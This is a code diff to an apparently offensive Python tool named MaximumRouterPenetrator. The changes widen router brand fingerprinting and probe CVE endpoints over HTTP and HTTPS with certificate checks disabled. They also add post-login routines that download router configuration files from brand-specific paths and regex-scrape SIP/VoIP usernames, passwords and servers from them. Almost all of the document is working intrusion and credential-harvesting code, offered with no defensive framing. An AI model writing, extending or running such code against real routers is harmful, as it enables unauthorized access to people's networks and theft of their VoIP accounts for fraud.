@@ -1186,24 +1186,31 @@ class MaximumRouterPenetrator:
                 if headers.get('server'):
                     print(f"         🔍 LIVE DEBUG: Server header: {headers.get('server')}")
             
-            # Step 2: Enhanced router brand detection
+            # Step 2: ENHANCED router brand detection with more indicators
             enhanced_brands = {
-                'netcomm': ['netcomm', 'nf-', 'nl-', 'netcommwireless', 'nf18', 'nf20', 'nf12', 'nf10'],
-                'tplink': ['tp-link', 'tl-', 'archer', 'tplink', 'tplinkwifi', 'mercusys', 'deco'],
-                'dlink': ['d-link', 'dir-', 'di-', 'dlink', 'dlinkrouter', 'eagle pro', 'dwr-'],
-                'cisco': ['cisco', 'ios', 'catalyst', 'cisco systems', 'linksys cisco'],
-                'huawei': ['huawei', 'hg-', 'eg-', 'honor', 'huawei technologies', 'b315', 'b525'],
-                'asus': ['asus', 'rt-', 'ac-', 'asusrouter', 'asuswrt', 'rog', 'ax-', 'be-'],
-                'linksys': ['linksys', 'wrt', 'ea-', 'velop', 'smart wi-fi', 'mr-', 'wrt32x'],
-                'belkin': ['belkin', 'f9k', 'f7d', 'f5d', 'play', 'n300', 'n600'],
-                'netgear': ['netgear', 'wndr', 'r6000', 'r7000', 'orbi', 'nighthawk', 'ac-', 'ax-'],
-                'zyxel': ['zyxel', 'zywall', 'usg', 'keenetic', 'nbg-', 'vmg-'],
-                'ubiquiti': ['ubiquiti', 'unifi', 'edgerouter', 'airmax', 'dream machine'],
-                'mikrotik': ['mikrotik', 'routeros', 'routerboard', 'winbox'],
-                'fritz': ['fritz', 'fritzbox', 'avm', 'fritz!box'],
-                'alcatel': ['alcatel', 'lucent', 'speedtouch', 'thomson'],
-                'sagemcom': ['sagemcom', 'livebox', 'fast'],
-                'technicolor': ['technicolor', 'tg-', 'tc-', 'mediaaccess']
+                'netcomm': ['netcomm', 'nf-', 'nl-', 'netcommwireless', 'nf18', 'nf20', 'nf12', 'nf10', 'netcomm nf', 'netcomm nl'],
+                'tplink': ['tp-link', 'tl-', 'archer', 'tplink', 'tplinkwifi', 'mercusys', 'deco', 'omada', 'jetstream'],
+                'dlink': ['d-link', 'dir-', 'di-', 'dlink', 'dlinkrouter', 'eagle pro', 'dwr-', 'dgs-', 'dap-'],
+                'cisco': ['cisco', 'ios', 'catalyst', 'cisco systems', 'linksys cisco', 'cisco router', 'cisco asa'],
+                'huawei': ['huawei', 'hg-', 'eg-', 'honor', 'huawei technologies', 'b315', 'b525', 'hg8245', 'hg8240'],
+                'asus': ['asus', 'rt-', 'ac-', 'asusrouter', 'asuswrt', 'rog', 'ax-', 'be-', 'asus zenwifi', 'asus aimesh'],
+                'linksys': ['linksys', 'wrt', 'ea-', 'velop', 'smart wi-fi', 'mr-', 'wrt32x', 'wrt1900', 'wrt3200'],
+                'belkin': ['belkin', 'f9k', 'f7d', 'f5d', 'play', 'n300', 'n600', 'belkin router'],
+                'netgear': ['netgear', 'wndr', 'r6000', 'r7000', 'orbi', 'nighthawk', 'ac-', 'ax-', 'netgear router'],
+                'zyxel': ['zyxel', 'zywall', 'usg', 'keenetic', 'nbg-', 'vmg-', 'zyxel router'],
+                'ubiquiti': ['ubiquiti', 'unifi', 'edgerouter', 'airmax', 'dream machine', 'unifi dream machine'],
+                'mikrotik': ['mikrotik', 'routeros', 'routerboard', 'winbox', 'mikrotik router'],
+                'fritz': ['fritz', 'fritzbox', 'avm', 'fritz!box', 'fritz box', 'fritzbox 7590'],
+                'alcatel': ['alcatel', 'lucent', 'speedtouch', 'thomson', 'alcatel-lucent'],
+                'sagemcom': ['sagemcom', 'livebox', 'fast', 'sagemcom router'],
+                'technicolor': ['technicolor', 'tg-', 'tc-', 'mediaaccess', 'technicolor router'],
+                'zyxel': ['zyxel', 'zywall', 'usg', 'keenetic', 'nbg-', 'vmg-', 'zyxel router'],
+                'totolink': ['totolink', 'a3004ns', 'a6004ns', 'totolink router'],
+                'tenda': ['tenda', 'ac15', 'ac18', 'tenda router', 'tenda wifi'],
+                'mercury': ['mercury', 'mw', 'mercury router', 'mercury wireless'],
+                'phicomm': ['phicomm', 'k2', 'k2p', 'phicomm router'],
+                'xiaomi': ['xiaomi', 'mi router', 'xiaomi wifi', 'mi wifi'],
+                'huawei': ['huawei', 'hg-', 'eg-', 'honor', 'huawei technologies', 'b315', 'b525', 'hg8245', 'hg8240', 'huawei router']
             }
             
             detected_brand = None
@@ -1350,51 +1357,55 @@ class MaximumRouterPenetrator:
                 print(f"               🔗 Testing {cve_id}: {cve_info['description'][:50]}...")
             
             for endpoint in cve_info['endpoints']:
-                try:
-                    url = f"http://{ip}{endpoint}"
-                    
-                    if verbose:
-                        print(f"                  📡 Endpoint: {endpoint}")
-                    
-                    if REQUESTS_AVAILABLE:
-                        response = requests.get(url, timeout=self.performance_config['timeouts']['connection'])
-                        content = response.text
-                        status = response.status_code
-                    else:
-                        response = urllib.request.urlopen(url, timeout=self.performance_config['timeouts']['connection'])
-                        content = response.read().decode('utf-8', errors='ignore')
-                        status = response.status
-                    
-                    if status == 200 and len(content) > 100:
-                        # Verify with indicators
-                        indicators = cve_info['verification']
-                        found = sum(1 for ind in indicators if ind.lower() in content.lower())
+                # Test both HTTP and HTTPS protocols
+                for protocol in ['http', 'https']:
+                    try:
+                        url = f"{protocol}://{ip}{endpoint}"
                         
                         if verbose:
-                            print(f"                  📊 Verification score: {found}/{len(indicators)}")
+                            print(f"                  📡 Endpoint: {endpoint} ({protocol})")
                         
-                        if found >= 2:
-                            cve_result = {
-                                'success': True,
-                                'cve_used': cve_id,
-                                'endpoint': endpoint,
-                                'content': content
-                            }
+                        if REQUESTS_AVAILABLE:
+                            response = requests.get(url, timeout=self.performance_config['timeouts']['connection'], 
+                                                  verify=False, allow_redirects=False)
+                            content = response.text
+                            status = response.status_code
+                        else:
+                            response = urllib.request.urlopen(url, timeout=self.performance_config['timeouts']['connection'])
+                            content = response.read().decode('utf-8', errors='ignore')
+                            status = response.status
+                    
+                        if status == 200 and len(content) > 100:
+                            # Verify with indicators
+                            indicators = cve_info['verification']
+                            found = sum(1 for ind in indicators if ind.lower() in content.lower())
                             
                             if verbose:
-                                print(f"               ✅ CVE SUCCESS: {cve_id}")
-                            return cve_result
+                                print(f"                  📊 Verification score: {found}/{len(indicators)}")
+                            
+                            if found >= 2:
+                                cve_result = {
+                                    'success': True,
+                                    'cve_used': cve_id,
+                                    'endpoint': endpoint,
+                                    'protocol': protocol,
+                                    'content': content
+                                }
+                                
+                                if verbose:
+                                    print(f"               ✅ CVE SUCCESS: {cve_id} via {protocol}")
+                                return cve_result
+                            else:
+                                if verbose:
+                                    print(f"                  ❌ Low verification score")
                         else:
                             if verbose:
-                                print(f"                  ❌ Low verification score")
-                    else:
-                        if verbose:
-                            print(f"                  ❌ HTTP {status} or insufficient content")
-                
-                except Exception as e:
-                    if verbose:
-                        print(f"                  ❌ Error: {str(e)}")
-                    continue
+                                print(f"                  ❌ {protocol.upper()} {status} or insufficient content")
+                    
+                    except Exception as e:
+                        if verbose and 'timed out' not in str(e).lower():
+                            print(f"                  ❌ Error: {str(e)[:100]}")
+                        continue
         
         if verbose:
             print(f"            ❌ All CVE tests unsuccessful")
@@ -1492,6 +1503,40 @@ class MaximumRouterPenetrator:
                                     print(f"            📸 LIVE DEBUG: PoC evidence captured: {len(screenshot_evidence['screenshots_captured'])} screenshots")
                     elif verbose and self.screenshot_mode:
                         print(f"            📸 LIVE DEBUG: Screenshot mode disabled for maximum speed")
+                    
+                    # PERFORM ADVANCED SIP EXTRACTION AFTER SUCCESSFUL LOGIN
+                    if verbose:
+                        print(f"            📞 LIVE DEBUG: Performing advanced SIP extraction...")
+                    
+                    sip_extraction_result = self._perform_authenticated_sip_extraction(
+                        ip, auth_result.get('session'), router_info.get('brand', 'unknown'), verbose
+                    )
+                    
+                    if sip_extraction_result['success']:
+                        auth_result['sip_extraction'] = sip_extraction_result
+                        auth_result['sip_accounts'] = sip_extraction_result.get('accounts', [])
+                        if verbose:
+                            print(f"            ✅ LIVE DEBUG: SIP extraction successful: {len(sip_extraction_result.get('accounts', []))} accounts")
+                    else:
+                        if verbose:
+                            print(f"            ❌ LIVE DEBUG: SIP extraction failed")
+                    
+                    # PERFORM CONFIG FILE EXTRACTION AFTER SUCCESSFUL LOGIN
+                    if verbose:
+                        print(f"            📁 LIVE DEBUG: Performing config file extraction...")
+                    
+                    config_extraction_result = self._perform_config_file_extraction(
+                        ip, auth_result.get('session'), router_info.get('brand', 'unknown'), verbose
+                    )
+                    
+                    if config_extraction_result['success']:
+                        auth_result['config_extraction'] = config_extraction_result
+                        auth_result['config_files'] = config_extraction_result.get('files', [])
+                        if verbose:
+                            print(f"            ✅ LIVE DEBUG: Config extraction successful: {len(config_extraction_result.get('files', []))} files")
+                    else:
+                        if verbose:
+                            print(f"            ❌ LIVE DEBUG: Config extraction failed")
                     
                     return auth_result
                 else:
@@ -2285,6 +2330,158 @@ class MaximumRouterPenetrator:
         
         return sip_extraction_result
     
+    def _perform_config_file_extraction(self, ip: str, session, router_brand: str, verbose: bool) -> Dict[str, Any]:
+        """Perform config file extraction after successful login"""
+        config_result = {
+            'success': False,
+            'files': [],
+            'total_size': 0,
+            'extraction_method': 'authenticated'
+        }
+        
+        if not session:
+            if verbose:
+                print(f"            ❌ LIVE DEBUG: No session available for config extraction")
+            return config_result
+        
+        try:
+            if verbose:
+                print(f"            🔍 LIVE DEBUG: Extracting config files for {router_brand}...")
+            
+            # Get router-specific config paths
+            config_paths = self._get_router_config_paths(router_brand)
+            
+            for config_path in config_paths:
+                try:
+                    if verbose:
+                        print(f"               📁 Testing: {config_path}")
+                    
+                    # Try both HTTP and HTTPS
+                    for protocol in ['http', 'https']:
+                        try:
+                            url = f"{protocol}://{ip}{config_path}"
+                            response = session.get(url, timeout=self.performance_config['timeouts']['connection'], 
+                                                verify=False, allow_redirects=False)
+                            
+                            if response.status_code == 200 and len(response.content) > 100:
+                                config_file = {
+                                    'path': config_path,
+                                    'protocol': protocol,
+                                    'size': len(response.content),
+                                    'content': response.text,
+                                    'url': url,
+                                    'extracted_at': datetime.now().isoformat()
+                                }
+                                
+                                config_result['files'].append(config_file)
+                                config_result['total_size'] += len(response.content)
+                                
+                                if verbose:
+                                    print(f"               ✅ LIVE DEBUG: Config file found: {config_path} ({len(response.content)} bytes)")
+                                
+                                # Extract SIP data from config file
+                                sip_data = self._extract_sip_from_config_content(response.text, verbose)
+                                if sip_data:
+                                    config_file['sip_data'] = sip_data
+                                    if verbose:
+                                        print(f"               📞 LIVE DEBUG: SIP data found in config: {len(sip_data)} accounts")
+                                
+                                break  # Found on this protocol, no need to try the other
+                        
+                        except Exception as e:
+                            if verbose and 'timed out' not in str(e).lower():
+                                print(f"               ❌ LIVE DEBUG: {protocol} error: {str(e)[:50]}")
+                            continue
+                
+                except Exception as e:
+                    if verbose:
+                        print(f"               ❌ LIVE DEBUG: Config path error: {str(e)[:50]}")
+                    continue
+            
+            if config_result['files']:
+                config_result['success'] = True
+                if verbose:
+                    print(f"            ✅ LIVE DEBUG: Config extraction successful: {len(config_result['files'])} files, {config_result['total_size']} bytes")
+            else:
+                if verbose:
+                    print(f"            ❌ LIVE DEBUG: No config files found")
+        
+        except Exception as e:
+            if verbose:
+                print(f"            ❌ LIVE DEBUG: Config extraction error: {str(e)}")
+        
+        return config_result
+    
+    def _get_router_config_paths(self, router_brand: str) -> List[str]:
+        """Get router-specific config file paths"""
+        brand_configs = {
+            'netcomm': [
+                '/config.xml', '/backup.conf', '/cgi-bin/config.exp',
+                '/admin/config.xml', '/cgi-bin/backup.cgi', '/settings.xml'
+            ],
+            'tplink': [
+                '/userRpm/ConfigRpm.htm', '/cgi-bin/luci/admin/system/admin',
+                '/cgi-bin/config.cgi', '/admin/config.asp'
+            ],
+            'dlink': [
+                '/config.xml', '/admin/config.asp', '/tools_admin.asp',
+                '/maintenance/backup.asp', '/cgi-bin/config.exp'
+            ],
+            'cisco': [
+                '/admin/config.xml', '/cgi-bin/config.exp', '/voice/config',
+                '/admin/voice.xml', '/cgi-bin/voice_config.cgi'
+            ],
+            'huawei': [
+                '/config.xml', '/cgi-bin/baseinfoSet.cgi', '/html/ssmp/config/config.asp',
+                '/cgi-bin/config.exp', '/html/ssmp/voip/voip.asp'
+            ],
+            'asus': [
+                '/Advanced_System_Content.asp', '/cgi-bin/config.cgi',
+                '/Advanced_SettingBackup_Content.asp', '/Advanced_VoIP_Content.asp'
+            ],
+            'linksys': [
+                '/JNAP/', '/ui/dynamic.json', '/sysinfo.cgi',
+                '/JNAP/core/Transaction', '/voice.json'
+            ]
+        }
+        
+        return brand_configs.get(router_brand.lower(), brand_configs['netcomm'])
+    
+    def _extract_sip_from_config_content(self, content: str, verbose: bool) -> List[Dict]:
+        """Extract SIP data from config file content"""
+        sip_accounts = []
+        
+        # Enhanced SIP patterns for config files
+        sip_patterns = [
+            r'sip\s*:\s*([^@\s]+)@([^:\s]+):?(\d+)?',
+            r'username\s*[=:]\s*([^\s\n]+).*?password\s*[=:]\s*([^\s\n]+)',
+            r'registrar\s*[=:]\s*([^\s\n]+).*?username\s*[=:]\s*([^\s\n]+)',
+            r'voip\s+account\s+(\d+).*?username\s+([^\s\n]+).*?password\s+([^\s\n]+)',
+            r'sip\s+user\s+([^\s\n]+).*?password\s+([^\s\n]+)',
+            r'account\s+(\d+).*?user\s+([^\s\n]+).*?pass\s+([^\s\n]+)'
+        ]
+        
+        for pattern in sip_patterns:
+            try:
+                matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE | re.DOTALL)
+                for match in matches:
+                    if len(match) >= 2:
+                        account = {
+                            'username': match[0] if len(match) > 0 else '',
+                            'password': match[1] if len(match) > 1 else '',
+                            'server': match[2] if len(match) > 2 else '',
+                            'source': 'config_file',
+                            'extracted_at': datetime.now().isoformat()
+                        }
+                        sip_accounts.append(account)
+                        
+                        if verbose:
+                            print(f"                  📞 LIVE DEBUG: SIP account found: {account['username']}@{account.get('server', 'unknown')}")
+            except:
+                continue
+        
+        return sip_accounts
+    
     def _extract_authenticated_sip_data(self, content: str, router_paths: Dict, verbose: bool) -> List[Dict]:
         """Extract SIP data from authenticated pages"""
         accounts = []
@@ -2780,10 +2977,16 @@ class MaximumRouterPenetrator:
                         'login_indicators': 0
                     }
                     
-                    # Check for login indicators
+                    # Check for login indicators (ENHANCED)
                     login_indicators = [
                         'login', 'username', 'password', 'authentication',
-                        'admin', 'signin', 'logon', 'auth'
+                        'admin', 'signin', 'logon', 'auth', 'user', 'pass',
+                        'sign in', 'log in', 'enter', 'access', 'control',
+                        'management', 'config', 'setup', 'wizard', 'welcome',
+                        'router', 'gateway', 'modem', 'interface', 'panel',
+                        'dashboard', 'home', 'main', 'index', 'default',
+                        'form', 'submit', 'button', 'input', 'field',
+                        'session', 'cookie', 'token', 'csrf', 'security'
                     ]
                     
                     indicators_found = sum(1 for indicator in login_indicators 
@@ -2812,7 +3015,7 @@ class MaximumRouterPenetrator:
             if port_info:
                 port_results['open_ports'].append(port_info)
                 
-                if port_info['login_indicators'] >= 2:  # Likely login page
+                if port_info['login_indicators'] >= 1:  # Likely login page (lowered threshold)
                     port_results['login_pages_found'].append(port_info)
                     
                     if verbose:
@@ -2880,10 +3083,16 @@ class MaximumRouterPenetrator:
                                 'login_indicators': 0
                             }
                             
-                            # Check for login indicators
+                            # Check for login indicators (ENHANCED)
                             login_indicators = [
                                 'login', 'username', 'password', 'authentication',
-                                'admin', 'signin', 'logon', 'auth'
+                                'admin', 'signin', 'logon', 'auth', 'user', 'pass',
+                                'sign in', 'log in', 'enter', 'access', 'control',
+                                'management', 'config', 'setup', 'wizard', 'welcome',
+                                'router', 'gateway', 'modem', 'interface', 'panel',
+                                'dashboard', 'home', 'main', 'index', 'default',
+                                'form', 'submit', 'button', 'input', 'field',
+                                'session', 'cookie', 'token', 'csrf', 'security'
                             ]
                             
                             indicators_found = sum(1 for indicator in login_indicators 
@@ -2892,7 +3101,7 @@ class MaximumRouterPenetrator:
                             port_info['login_indicators'] = indicators_found
                             port_results['open_ports'].append(port_info)
                             
-                            if indicators_found >= 2:  # Likely login page
+                            if indicators_found >= 1:  # Likely login page (lowered threshold)
                                 port_results['login_pages_found'].append(port_info)
                                 
                                 if verbose:
